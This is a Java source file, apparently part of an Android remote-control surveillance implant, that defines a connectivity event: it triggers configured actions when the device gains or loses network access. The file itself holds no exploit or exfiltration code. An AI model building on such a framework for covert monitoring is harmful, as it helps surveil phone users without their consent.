package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.util.Log;

import com.ht.RCSAndroidGUI.Connectivity;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerConnectivity;
import com.ht.RCSAndroidGUI.util.DataBuffer;

public class ConnectivityEvent extends EventBase implements Observer<Connectivity> {
		/** The Constant TAG. */
		private static final String TAG = "ConnectivityEvent";

		private int actionOnExit, actionOnEnter;
		private boolean inRange = false;
		
		@Override
		public void begin() {
			ListenerConnectivity.self().attach(this);
		}

		@Override
		public void end() {
			ListenerConnectivity.self().detach(this);
		}

		@Override
		public boolean parse(EventConf event) {
			super.setEvent(event);

			final byte[] conf = event.getParams();

			final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
			
			try {
				actionOnEnter = event.getAction();
				actionOnExit = databuffer.readInt();
			} catch (final IOException e) {
				Log.d("QZ", TAG + " Error: params FAILED");
				return false;
			}
			
			return true;
		}

		@Override
		public void go() {
			// TODO Auto-generated method stub
		}

		// Viene richiamata dal listener (dalla dispatch())
		public void notification(Connectivity c) {
			Log.d("QZ", TAG + " Got connectivity status notification: " + c.isConnected());

			// Nel range
			if (c.isConnected() == true && inRange == false) {
				inRange = true;
				Log.d("QZ", TAG + " Connectivity IN");
				onEnter();
			} else if (c.isConnected() == false && inRange == true) {
				inRange = false;
				Log.d("QZ", TAG + " Connectivity OUT");
				onExit();
			}
		}
		
		public void onEnter() {
			trigger(actionOnEnter);
		}

		public void onExit() {
			trigger(actionOnExit);
		}
}